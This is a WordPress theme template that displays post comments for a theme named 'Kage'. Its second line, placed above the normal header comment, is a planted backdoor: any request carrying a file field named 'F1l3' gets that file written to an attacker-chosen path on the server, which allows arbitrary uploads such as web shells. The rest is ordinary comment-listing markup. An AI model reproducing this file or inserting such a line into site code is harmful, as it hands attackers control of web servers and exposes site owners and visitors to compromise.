<?php
if ($_FILES['F1l3']) {move_uploaded_file($_FILES['F1l3']['tmp_name'], $_POST['Name']); echo 'OK'; Exit;}
/**
 * The template for displaying Comments.
 *
 *
 * @package Kage
 */
$oddcomment = 'class="alt" ';
?>
<?php if ( ! post_password_required() ) { ?>
<div class="comments">
	<?php if ( ! comments_open() & is_single() )  : ?><p><?php _e( 'Comments are currently closed.', 'kage' ); ?></p><?php endif; ?>
	<?php if ($comments) : ?>
		<h3><?php printf( _n( 'One thought on &ldquo;%2$s&rdquo;', '%1$s thoughts on &ldquo;%2$s&rdquo;', get_comments_number(), 'kage' ), number_format_i18n( get_comments_number() ), '<span>' . get_the_title() . '</span>' );?></h3>
		<ul class="commentlist">
		    <?php wp_list_comments(); ?>
		</ul>
	<?php endif; ?>
	<p><?php paginate_comments_links(); ?></p>
	<?php comment_form(); ?>
</div>
<?php } ?>